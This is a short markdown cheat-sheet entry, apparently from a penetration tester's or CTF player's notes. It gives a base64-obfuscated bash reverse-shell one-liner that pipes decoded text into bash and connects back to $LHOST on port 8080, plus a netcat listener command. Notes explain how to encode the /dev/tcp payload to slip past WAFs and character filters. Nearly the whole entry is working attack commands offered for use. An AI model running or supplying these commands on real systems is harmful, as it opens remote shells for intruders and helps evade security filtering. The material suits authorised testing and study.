# Bash Base64 Reverse Shell

A base64 encoded bash reverse shell to bypass bad characters and rudimentary filters.

Used on: **<Machine>**

## One-liner

<!-- cmd: linux -->
```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8kTEhPU1QvODA4MCAwPiYx" | base64 -d | bash
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

## Notes

- Useful when dealing with WAFs or when characters like `&` and `>` are filtered.
- The base64 string decodes to `bash -i >& /dev/tcp/$LHOST/8080 0>&1`. You will need to encode your own payload with your `$LHOST` and port before using.
- To encode your payload: `echo -n "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" | base64`
